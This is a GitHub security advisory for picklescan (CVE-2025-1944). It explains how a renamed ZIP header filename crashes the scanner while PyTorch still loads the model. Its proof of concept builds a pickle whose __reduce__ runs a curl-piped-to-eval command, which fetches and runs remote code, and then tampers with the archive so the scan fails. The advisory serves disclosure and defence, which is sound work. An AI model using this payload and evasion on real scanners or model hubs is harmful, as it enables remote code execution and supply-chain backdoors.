# [M] Zip Exploit Crashes Picklescan But Not PyTorch 

## Summary
Severity: Medium
Advisory: GHSA-7q5r-7gvp-wc82
CVE: CVE-2025-1944
CWE: CWE-345
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:L (CVSS_V3)
Published: 2025-03-10
Source: https://github.com/advisories/GHSA-7q5r-7gvp-wc82
Type: github-advisory

## Affected
- PyPI: `picklescan` — affected >=0 <0.0.23

## Details
### Summary

PickleScan is vulnerable to a ZIP archive manipulation attack that causes it to crash when attempting to extract and scan PyTorch model archives. By modifying the filename in the ZIP header while keeping the original filename in the directory listing, an attacker can make PickleScan raise a BadZipFile error. However, PyTorch's more forgiving ZIP implementation still allows the model to be loaded, enabling malicious payloads to bypass detection.

### Details

Python's built-in zipfile module performs strict integrity checks when extracting ZIP files. If a filename stored in the ZIP header does not match the filename in the directory listing, zipfile.ZipFile.open() raises a BadZipFile error. PickleScan relies on zipfile to extract and inspect the contents of PyTorch model archives, making it susceptible to this manipulation.

PyTorch, on the other hand, has a more tolerant ZIP handling mechanism that ignores these discrepancies, allowing the model to load even when PickleScan fails. An attacker can exploit this behavior to embed a malicious pickle file inside a model archive, which PyTorch will load, while preventing PickleScan from scanning the archive.

### PoC
```
import os
import torch

class RemoteCodeExecution:
    def __reduce__(self):
        return os.system, (f"eval \"$(curl -s http://localhost:8080)\"",)


model = RemoteCodeExecution()
file = "does_not_scan_but_opens_in_torch.pth"
torch.save(model, file)

# modify the header to cause the zip file to raise execution in picklescan
with open(file, "rb") as f:
    data = f.read()

# Replace only the first occurrence of "data.pkl" with "datap.kl"
modified_data = data.replace(b"data.pkl", b"datap.kl", 1)

# Write back the modified content
with open(file, "wb") as f:
    f.write(modified_data)

# Load the infected model
torch.load(file)  
```

### Impact

Severity: `High`

- Who is impacted? Any organization or individual using PickleScan to detect malicious pickle files in PyTorch models.

- What is the impact? Attackers can embed malicious payloads inside PyTorch model archives while preventing PickleScan from scanning them.

- Potential Exploits: This technique can be used in supply chain attacks to distribute backdoored models via platforms like Hugging Face.

### Recommendations

- Use a More Tolerant ZIP Parser: PickleScan should handle minor ZIP header inconsistencies more gracefully instead of failing outright.

- Detect Malformed ZIPs: Instead of crashing, PickleScan should log warnings and attempt to extract valid files.

## References
- https://github.com/mmaitre314/picklescan/security/advisories/GHSA-7q5r-7gvp-wc82
- https://nvd.nist.gov/vuln/detail/CVE-2025-1944
- https://github.com/mmaitre314/picklescan/commit/e58e45e0d9e091159c1554f9b04828bbb40b9781
- https://github.com/mmaitre314/picklescan
- https://github.com/pypa/advisory-database/tree/main/vulns/picklescan/PYSEC-2025-20.yaml
- https://sites.google.com/sonatype.com/vulnerabilities/cve-2025-1944
